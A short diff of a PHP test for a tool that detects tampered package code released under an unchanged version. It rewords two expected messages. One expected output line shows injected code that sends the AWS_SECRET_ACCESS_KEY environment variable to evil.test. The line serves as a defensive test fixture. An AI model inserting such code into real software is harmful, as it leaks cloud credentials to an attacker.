@@ -18,8 +18,8 @@ it('reads the delta of a tree whose bytes changed at the trusted version', funct
     expect($status)->toBe(1)
         ->and($output)
         ->toContain('acme/widget 1.0.0')
-        ->toContain('1 files (delta from the published [1.0.0])')
-        ->toContain('[1.0.0] is still installed but its bytes changed')
+        ->toContain('1 file changed')
+        ->toContain('same version, different code')
         ->toContain('runtime source (1)')
         ->toContain('~ src/Widget.php')
         ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));");
